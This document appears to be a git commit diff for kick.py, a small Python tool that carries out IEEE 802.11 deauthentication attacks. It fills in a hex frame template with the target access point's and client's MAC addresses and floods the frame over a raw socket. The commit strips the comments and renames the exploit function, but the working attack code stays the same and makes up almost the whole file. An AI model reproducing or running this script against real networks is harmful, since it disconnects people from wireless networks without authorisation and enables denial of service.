61ad4783a2b757057de69f2b75e4ff806427cb00
Oelin <42823429+Oelin@users.noreply.github.com>
2020-07-21 14:31:16 +0100

    Update kick.py

--- kick.py
+++ kick.py
@@ -1,49 +1,27 @@
 #!/usr/bin/env python3
 
 
-
-'''kick, conduct IEEE 802.11 deauthenticate attacks.
-
-Usage: kick <if> <wap> <sta>
-
-An attacker can force WPA supplicants to disconnect from a wireless
-access point by emitting fictitious deauthenticate packets.'''
-
+'usage: kick <if> <wap> <sta>'
 
 
 from socket import *
 from sys import argv
 
 
+template = '00000d00048002000200010000c0003a01{0}{1}{0}706a0100'
 
-# A template for generic 802.11 deauthenticate packets. Can't be 
-# bothered with the details of each feild.
-
-deauth = '00000d00048002000200010000c0003a01{0}{1}{0}706a0100'
-
-
-
-# Remove colons from a MAC address, just leaving the hex string.
 
 def mac(string):
     return string.replace(':', str())
 
 
-
-# Construct a deauthenticate packet with inserted WAP and STA MAC
-# addresses.
-
 def construct(wap, sta):
 
-    string = deauth.format(mac(wap), mac(sta))
+    string = template.format(mac(wap), mac(sta))
     packet = bytes.fromhex(string)
 
     return packet
 
-
-
-# Repeatedly transmit a given packet using a certain network
-# interface.
 
 def flood(iface, packet):
     # Create a raw socket able to transmit from the data link layer.
@@ -55,11 +33,7 @@ def flood(iface, packet):
         link.send(packet)
 
 
-
-# Perform the deauthenticate attack. Construct a packet and flood the
-# target until an interrupt is recieved.
-
-def exploit(iface, wap, sta):
+def start(iface, wap, sta):
     try:
         packet = construct(wap, sta)
         flood(iface, packet)
@@ -67,22 +41,17 @@ def exploit(iface, wap, sta):
     except:
         return
         
-
-
-# Program entry point: take in command line arguments and call
-# exploit() with them.
-
+        
 def main():
     if len(argv) == 4:
 
-        print('Starting deauthenticate attack. ^C to quit.')
-        exploit(*argv[1:])
+        print('sending disassoc frames, hit ^C to stop.')
+        start(*argv[1:])
         
-        print('Bye')
+        print('bye')
 
     else:
         print(__doc__)
-
 
 
 main()
